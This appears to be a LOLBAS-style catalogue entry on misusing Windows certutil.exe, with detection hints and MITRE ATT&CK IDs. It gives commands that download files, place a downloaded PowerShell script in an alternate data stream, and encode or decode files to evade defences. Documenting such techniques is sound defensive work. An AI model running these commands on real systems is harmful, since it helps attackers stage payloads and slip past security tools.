<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
## Certutil.exe

`Certutil.exe`

**LOLBINs Tags**

* Download
* Alternate data streams
* Encode
* Decode 

Windows binary used for handeling certificates

Paths:

* `C:\Windows\System32\certutil.exe`
* `C:\Windows\SysWOW64\certutil.exe`

Resources:
https://twitter.com/Moriarty_Meng/status/984380793383370752
https://twitter.com/mattifestation/status/620107926288515072
https://twitter.com/egre55/status/1087685529016193025

Acknowledgement:
Matt Graeber - @mattifestation
Moriarty - @Moriarty_Meng
egre55 - @egre55
Lior Adar -

Detection:
Certutil.exe creating new files on disk
Useragent Microsoft-CryptoAPI/10.0
Useragent CertUtil URL Agent

Download
Download and save 7zip to disk in the current folder.

certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe

Usecase:Download file from Internet
Privileges required:User
OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Mitre:T1105

Download and save 7zip to disk in the current folder.

certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe

Usecase:Download file from Internet
Privileges required:User
OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Mitre:T1105

Alternate data streams
Download and save a PS1 file to an Alternate Data Stream (ADS).

certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

Usecase:Download file from Internet and save it in an NTFS Alternate Data Stream
Privileges required:User
OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Mitre:T1096

Encode
Command to encode a file using Base64

certutil -encode inputFileName encodedOutputFileName

Usecase:Encode files to evade defensive measures
Privileges required:User
OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Mitre:T1027

Decode
Command to decode a Base64 encoded file.

certutil -decode encodedInputFileName decodedOutputFileName

Usecase:Decode files to evade defensive measures
Privileges required:User
OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Mitre:T1140

Command to decode a hexadecimal-encoded file decodedOutputFileName

certutil --decodehex encoded_hexadecimal_InputFileName

Usecase:Decode files to evade defensive measures
Privileges required:User
OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Mitre:T1140